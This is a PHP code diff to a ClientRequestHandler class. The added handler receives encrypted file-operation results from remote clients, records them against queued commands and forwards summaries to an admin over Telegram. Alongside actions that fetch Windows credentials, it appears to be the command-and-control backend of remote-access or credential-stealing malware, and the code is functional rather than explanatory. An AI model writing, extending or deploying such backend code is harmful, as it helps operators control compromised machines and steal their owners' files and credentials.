@@ -117,9 +117,64 @@ class ClientRequestHandler
                 return $this->handleGetWindowsCredentials($clientId, $data);
             case 'report_credential_status':
                 return $this->handleReportCredentialStatus($clientId, $data);
+            case 'file_operation_result':
+                return $this->handleFileOperationResult($clientId, $data);
             default:
                 $this->logger->logError("Unknown action: $action");
                 return ['error' => 'Unknown action'];
+        }
+    }
+
+    private function handleFileOperationResult(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("File operation result: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+
+            $commandId = $data['command_id'] ?? null;
+            $result = isset($data['result']) ? $this->encryption->decrypt($data['result']) : '';
+
+            if (!$commandId) {
+                $this->logger->logError("Missing command_id in file operation result");
+                return ['error' => 'Missing command_id'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
+            WHERE id = ?"
+            );
+            $stmt->execute([$result, $commandId]);
+
+            // ارسال نوتیفیکیشن بر اساس نوع عملیات
+            $stmt = $this->pdo->prepare("SELECT command FROM client_commands WHERE id = ?");
+            $stmt->execute([$commandId]);
+            $commandData = $stmt->fetch();
+
+            if ($commandData) {
+                $decryptedCommand = $this->encryption->decrypt($commandData['command']);
+                $commandJson = json_decode($decryptedCommand, true);
+                $operationType = $commandJson['params']['action'] ?? 'unknown';
+
+                $message = "📁 File Operation: $operationType\n";
+                $message .= "Client: $clientId\n";
+
+                if ($result) {
+                    $resultData = json_decode($result, true);
+                    if ($resultData) {
+                        $message .= "Status: " . ($resultData['status'] ?? 'completed') . "\n";
+                        if (isset($resultData['message'])) {
+                            $message .= "Message: " . $resultData['message'];
+                        }
+                    }
+                }
+
+                $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+            }
+
+            $this->logger->logWebhook("File operation result saved for command_id: $commandId");
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("File operation result failed: " . $e->getMessage());
+            return ['error' => 'Result processing failed'];
         }
     }
 
